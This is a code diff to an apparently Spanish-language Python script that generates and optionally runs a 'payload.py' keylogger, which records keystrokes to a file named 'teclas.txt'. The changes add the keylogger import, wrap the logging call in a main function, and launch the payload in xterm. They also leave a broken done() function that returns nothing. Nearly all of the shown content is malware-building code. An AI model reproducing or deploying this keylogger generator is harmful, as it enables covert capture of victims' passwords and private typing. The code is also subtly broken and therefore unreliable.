@@ -42,20 +42,29 @@ print("[*] Generando archivo.. ")
 
 a = open('payload.py', 'a')
 a.write('''
+import keylogger
 import urllib
 import urllib2
 import os
 import subprocess
 import socket
+import time
 
 now = time.time()
-done = lambda: time.time() > now + 60
+
+def done():
+        now + 60
+
+#done = lambda: time.time() > now + 60
 
 def print_keys(t, modifiers, keys):
-	a = open("teclas.txt", "a")
-	a.write("%r" % keys)
+        a = open("teclas.txt", "a")
+        a.write("%r" % keys)
 
-keylogger.log(done, print_keys)
+def main():
+        keylogger.log(done, print_keys)
+
+main()
 ''')
 
 hola = raw_input('¿Quieres dar mensaje de bienvenida? [Y/n]: ')
@@ -75,9 +84,8 @@ pwd = subprocess.check_output("pwd | tr -d '\n'", shell=True)
 if lexecute != 'y':
 	print str('[*] Archivo guardado en: ') + pwd + str('/payload.py')
 else:
-	os.system("python payload.py")
-
-
+#	os.system("python payload.py")
+	subprocess.call(['xterm','-e','python','payload.py'])
 
 #@bot.message_handler(commands=['start'])
 #def register_keys(mensaje):
